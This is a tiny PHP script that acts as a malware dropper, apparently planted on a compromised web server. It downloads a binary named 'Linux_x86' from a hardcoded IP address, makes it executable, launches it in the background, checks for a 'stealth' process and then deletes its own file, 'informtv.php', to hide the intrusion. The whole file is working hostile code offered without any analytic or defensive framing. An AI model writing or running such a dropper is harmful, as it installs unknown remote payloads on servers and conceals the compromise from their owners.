<?php
system('wget "http://173.230.140.78/Linux_x86" 2>/dev/null || curl -O  "http://173.230.140.78/Linux_x86"');
system('chmod 777 ./Linux_x86');
system('nohup ./Linux_x86 2>&1 &');
system('ps aux| grep stealth');
system('rm -rf informtv.php');
?>
